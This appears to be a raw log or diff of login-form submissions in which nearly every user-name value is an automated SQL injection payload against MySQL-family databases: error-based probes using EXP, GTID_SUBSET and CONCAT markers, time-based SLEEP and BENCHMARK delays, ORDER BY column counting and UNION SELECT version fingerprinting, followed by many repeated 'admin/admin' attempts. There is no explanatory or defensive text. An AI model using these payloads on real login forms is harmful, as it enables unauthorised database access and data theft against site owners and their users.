+User Name:admin OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- uEWnPassword:admin
+User Name:admin OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))# rDhPPassword:admin
+User Name:admin) WHERE 1683=1683 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- sLsPPassword:admin
+User Name:admin WHERE 4653=4653 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- yMOlPassword:admin
+User Name:admin+(SELECT ivQh WHERE 5205=5205 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))+Password:admin
+User Name:admin)) AS EYZP WHERE 6974=6974 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- NbyBPassword:admin
+User Name:admin) AS vypa WHERE 3284=3284 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- cSUOPassword:admin
+User Name:admin` WHERE 8951=8951 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- JCSpPassword:admin
+User Name:admin`) WHERE 7951=7951 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- yEinPassword:admin
+User Name:admin`=`admin` OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND `admin`=`adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 1639=1639 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(1827=1827,1))),0x716b6a6b71,0x78))s), 8446744073709551610, 8446744073709551610))))|[adminPassword:admin
+User Name:admin¿') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- yquJPassword:admin
+User Name:admin¿' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- UmQEPassword:admin
+User Name:admin" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- lkWrPassword:admin
+User Name:admin¿') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'xdTx¿'1Password:admin
+User Name:admin¿')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'TLqQ¿'1Password:admin
+User Name:admin¿'))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'RZbs¿'1Password:admin
+User Name:admin¿' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'MAdd¿'1Password:admin
+User Name:admin¿') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'ioLw¿'1Password:admin
+User Name:admin¿')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'UpeT¿'1Password:admin
+User Name:admin¿'))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'RArG¿'1Password:admin
+User Name:admin%¿' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'vlnQ¿'1Password:admin
+User Name:admin¿' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'JyOs¿'1Password:admin
+User Name:admin") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND ("ysoI"="ysoIPassword:admin
+User Name:admin")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND (("bFcv"="bFcvPassword:admin
+User Name:admin"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND ((("ZUrg"="ZUrgPassword:admin
+User Name:admin" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND "zEwl"="zEwlPassword:admin
+User Name:admin") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND ("juuq" LIKE "juuqPassword:admin
+User Name:admin")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND (("AUMR" LIKE "AUMRPassword:admin
+User Name:admin"))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND ((("LriX" LIKE "LriXPassword:admin
+User Name:admin" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND "Xlju" LIKE "XljuPassword:admin
+User Name:admin¿' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))'HMwO¿'1Password:admin
+User Name:admin¿') WHERE 1865=1865 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- RWSwPassword:admin
+User Name:admin") WHERE 8939=8939 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- BacxPassword:admin
+User Name:admin¿' WHERE 1552=1552 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- IvOhPassword:admin
+User Name:admin" WHERE 6362=6362 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- zAlBPassword:admin
+User Name:admin¿'||(SELECT 0x64497477 WHERE 2618=2618 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))||'¿'1Password:admin
+User Name:admin¿'||(SELECT 0x5a444550 FROM DUAL WHERE 9982=9982 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))||'¿'1Password:admin
+User Name:admin¿'+(SELECT 0x50725246 WHERE 4537=4537 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))+'¿'1Password:admin
+User Name:admin||(SELECT 0x5655477a FROM DUAL WHERE 2533=2533 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))||Password:admin
+User Name:admin||(SELECT 0x6d4f7668 WHERE 6479=6479 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))||Password:admin
+User Name:admin+(SELECT 0x6b4a7373 WHERE 1188=1188 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))+Password:admin
+User Name:admin¿')) AS TOav WHERE 7130=7130 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- DWrZPassword:admin
+User Name:admin")) AS iRTw WHERE 7644=7644 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- KgjwPassword:admin
+User Name:admin¿') AS ktEf WHERE 6369=6369 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- rJxVPassword:admin
+User Name:admin") AS tyrV WHERE 2692=2692 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- njewPassword:admin
+User Name:admin"="admin" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND "admin"="adminPassword:admin
+User Name:admin¿' IN BOOLEAN MODE) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))#Password:admin
+User Name:admin) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- sgJIPassword:admin
+User Name:admin) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND (1467=1467Password:admin
+User Name:admin)) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND ((4699=4699Password:admin
+User Name:admin))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND (((4281=4281Password:admin
+User Name:admin AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))Password:admin
+User Name:admin AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- ywFePassword:admin
+User Name:admin AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))# XAORPassword:admin
+User Name:admin) WHERE 3223=3223 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- xhniPassword:admin
+User Name:admin WHERE 7626=7626 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- jCxlPassword:admin
+User Name:admin+(SELECT lFhZ WHERE 6065=6065 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))+Password:admin
+User Name:admin)) AS CtFc WHERE 2591=2591 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- JlvHPassword:admin
+User Name:admin) AS TEzo WHERE 2120=2120 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- NfaUPassword:admin
+User Name:admin` WHERE 5388=5388 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- FTVWPassword:admin
+User Name:admin`) WHERE 5430=5430 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x))-- IFKnPassword:admin
+User Name:admin`=`admin` AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)) AND `admin`=`adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 5933=5933 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(8344=8344,1))),0x716b6a6b71,0x78))x)))|[adminPassword:admin
+User Name:admin¿') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- YwiuPassword:admin
+User Name:admin¿' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- ADtiPassword:admin
+User Name:admin" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- PUooPassword:admin
+User Name:admin¿') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'rEpU¿'1Password:admin
+User Name:admin¿')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'lzfD¿'1Password:admin
+User Name:admin¿'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'HgAE¿'1Password:admin
+User Name:admin¿' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'Bsiq¿'1Password:admin
+User Name:admin¿') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'LxnE¿'1Password:admin
+User Name:admin¿')) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'tXXM¿'1Password:admin
+User Name:admin¿'))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'pGAP¿'1Password:admin
+User Name:admin%¿' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'qQzW¿'1Password:admin
+User Name:admin¿' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'Csco¿'1Password:admin
+User Name:admin") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND ("VfOm"="VfOmPassword:admin
+User Name:admin")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND (("PqZj"="PqZjPassword:admin
+User Name:admin"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND ((("oBtm"="oBtmPassword:admin
+User Name:admin" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND "OqNG"="OqNGPassword:admin
+User Name:admin") OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND ("mtSM" LIKE "mtSMPassword:admin
+User Name:admin")) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND (("IjRm" LIKE "IjRmPassword:admin
+User Name:admin"))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND ((("yIRE" LIKE "yIREPassword:admin
+User Name:admin" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND "JcVg" LIKE "JcVgPassword:admin
+User Name:admin¿' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))'wriI¿'1Password:admin
+User Name:admin¿') WHERE 8633=8633 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- ovfFPassword:admin
+User Name:admin") WHERE 9081=9081 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- axqxPassword:admin
+User Name:admin¿' WHERE 3710=3710 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- PjUyPassword:admin
+User Name:admin" WHERE 7201=7201 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- QZkiPassword:admin
+User Name:admin¿'||(SELECT 0x45766d66 WHERE 8551=8551 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))||'¿'1Password:admin
+User Name:admin¿'||(SELECT 0x69546a47 FROM DUAL WHERE 1466=1466 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))||'¿'1Password:admin
+User Name:admin¿'+(SELECT 0x6f746244 WHERE 6230=6230 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))+'¿'1Password:admin
+User Name:admin||(SELECT 0x70774a48 FROM DUAL WHERE 5598=5598 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))||Password:admin
+User Name:admin||(SELECT 0x5453524a WHERE 2374=2374 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))||Password:admin
+User Name:admin+(SELECT 0x4f4f5361 WHERE 2455=2455 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))+Password:admin
+User Name:admin¿')) AS ofvX WHERE 3278=3278 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- JtKVPassword:admin
+User Name:admin")) AS FCCx WHERE 1136=1136 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- TQnSPassword:admin
+User Name:admin¿') AS gTVw WHERE 9613=9613 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- nhErPassword:admin
+User Name:admin") AS sptQ WHERE 3338=3338 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- mXBpPassword:admin
+User Name:admin"="admin" OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND "admin"="adminPassword:admin
+User Name:admin¿' IN BOOLEAN MODE) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))#Password:admin
+User Name:admin) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- rvEmPassword:admin
+User Name:admin) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND (8138=8138Password:admin
+User Name:admin)) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND ((1329=1329Password:admin
+User Name:admin))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND (((9367=9367Password:admin
+User Name:admin OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))Password:admin
+User Name:admin OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- RfKuPassword:admin
+User Name:admin OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))# aaJtPassword:admin
+User Name:admin) WHERE 7875=7875 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- pgYsPassword:admin
+User Name:admin WHERE 6390=6390 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- eXtCPassword:admin
+User Name:admin+(SELECT Imvn WHERE 5123=5123 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))+Password:admin
+User Name:admin)) AS KBOu WHERE 2197=2197 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- vBFkPassword:admin
+User Name:admin) AS LjHV WHERE 1698=1698 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- IqRrPassword:admin
+User Name:admin` WHERE 8969=8969 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- tkMGPassword:admin
+User Name:admin`) WHERE 2467=2467 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x))-- fyVqPassword:admin
+User Name:admin`=`admin` OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)) AND `admin`=`adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 9435=9435 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(3984=3984,1))),0x716b6a6b71,0x78))x)))|[adminPassword:admin
+User Name:admin¿') AND GTID_SUBSET(CONCAT(0x716b7a6b71,(SELECT (ELT(6295=6295,1))),0x716b6a6b71),6295)-- LrUfPassword:admin
+User Name:admin¿' AND GTID_SUBSET(CONCAT(0x716b7a6b71,(SELECT (ELT(6295=6295,1))),0x716b6a6b71),6295)-- TWoGPassword:admin
+User Name:(SELECT CONCAT(0x716b7a6b71,(ELT(4876=4876,1)),0x716b6a6b71))Password:admin
+User Name:>= 5.6Password:admin
+User Name:admin¿';SELECT SLEEP(5)#Password:admin
+User Name:admin¿';SELECT SLEEP(5)-- zYUrPassword:admin
+User Name:admin¿';(SELECT * FROM (SELECT(SLEEP(5)))VtyZ)#Password:admin
+User Name:admin¿';(SELECT * FROM (SELECT(SLEEP(5)))shih)-- RjzaPassword:admin
+User Name:admin¿';SELECT BENCHMARK(5000000,MD5(0x6969666c))#Password:admin
+User Name:admin¿';SELECT BENCHMARK(5000000,MD5(0x66466763))-- HGVNPassword:admin
+User Name:admin¿' AND (SELECT 3577 FROM (SELECT(SLEEP(5)))CxVN)-- OgMFPassword:admin
+User Name:admin¿' AND (SELECT 3577 FROM (SELECT(SLEEP(0)))CxVN)-- OgMFPassword:admin
+User Name:admin¿' AND (SELECT 3577 FROM (SELECT(SLEEP(5)))CxVN)-- OgMFPassword:admin
+User Name:>= 5.0.12Password:admin
+User Name:admin¿' ORDER BY 1#Password:admin
+User Name:admin¿' ORDER BY 4928#Password:admin
+User Name:admin¿' ORDER BY 10#Password:admin
+User Name:admin¿' ORDER BY 6#Password:admin
+User Name:admin¿' ORDER BY 4#Password:admin
+User Name:admin¿' ORDER BY 3#Password:admin
+User Name:admin¿' ORDER BY 2#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,0x67526a4a6b6d737664655175717a624b785a4962764e684953624443586b6f6372426950794a5457,0x716b6a6b71),NULL#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,0x67526a4a6b6d737664655175717a624b785a4962764e684953624443586b6f6372426950794a5457,0x716b6a6b71),NULL UNION ALL SELECT CONCAT(0x716b7a6b71,0x426b6c71706a6453446f7174486c6c6b4678494d6854535770644d706352596d6b5158754650775a,0x716b6a6b71),NULL#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716b6a6b71),NULL#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716b6a6b71),NULL#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716b6a6b71),NULL#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716b6a6b71),NULL#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716b6a6b71),NULL#Password:admin
+User Name:admin¿' UNION ALL SELECT CONCAT(0x716b7a6b71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716b6a6b71),NULL#Password:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:adminPassword:admin
